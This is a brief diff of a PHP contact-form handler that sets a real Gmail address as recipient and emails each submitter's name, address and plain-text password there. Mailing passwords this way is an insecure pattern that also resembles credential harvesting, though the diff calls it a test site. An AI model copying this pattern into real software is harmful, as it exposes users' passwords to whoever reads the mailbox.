@@ -5,8 +5,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = $_POST['password'];
     $confirm_password = $_POST['confirm_password'];
 
-    $to = 'tu@email.com';
-    $subject = 'Nuevo formulario de contacto';
+    $to = 'publicidadtelecelrespaldo@gmail.com';
+    $subject = 'Nuevo formulario de contacto desde sitio test';
     $message = "Nombre: $name\n";
     $message .= "Correo electrónico: $email\n";
     $message .= "Contraseña: $password\n";
